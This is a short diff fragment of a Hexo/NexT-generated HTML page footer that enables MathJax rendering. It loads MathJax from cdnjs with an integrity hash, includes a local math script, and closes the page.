+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+</body>
+</html>
